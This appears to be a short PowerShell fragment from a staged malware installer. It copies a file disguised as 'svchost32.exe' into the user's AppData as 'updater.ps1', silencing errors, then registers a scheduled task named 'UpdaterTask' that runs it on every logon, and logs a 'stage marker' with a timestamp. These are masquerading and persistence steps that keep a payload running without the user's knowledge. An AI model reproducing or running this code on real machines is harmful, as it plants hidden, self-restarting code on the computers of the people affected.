
Copy-Item -Path "$env:TEMP\svchost32.exe" -Destination "$env:APPDATA\updater.ps1" -Force -ErrorAction SilentlyContinue
schtasks.exe /Create /TN "UpdaterTask" /TR "powershell.exe -NoP -File `"$env:APPDATA\updater.ps1`"" /SC ONLOGON /F
Write-Verbose "stage marker 43 reached"
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
